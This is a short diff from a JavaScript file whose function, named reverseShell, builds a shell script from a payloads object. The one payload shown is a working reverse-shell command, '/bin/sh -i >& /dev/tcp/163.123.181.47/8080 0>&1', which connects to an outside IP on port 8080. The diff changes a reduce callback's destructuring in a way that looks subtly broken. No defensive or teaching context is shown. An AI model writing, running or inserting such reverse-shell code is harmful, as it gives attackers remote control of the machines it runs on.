@@ -22,7 +22,7 @@ const reverseShell = (address = '') => {
 		sh: `/bin/sh -i >& /dev/tcp/163.123.181.47/8080 0>&1`
 	};
 
-	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+	return Object.entries(payloads).reduce((script, [payload]) => {
 		script += `
 
 if command -v sh > /dev/null 2>&1; then
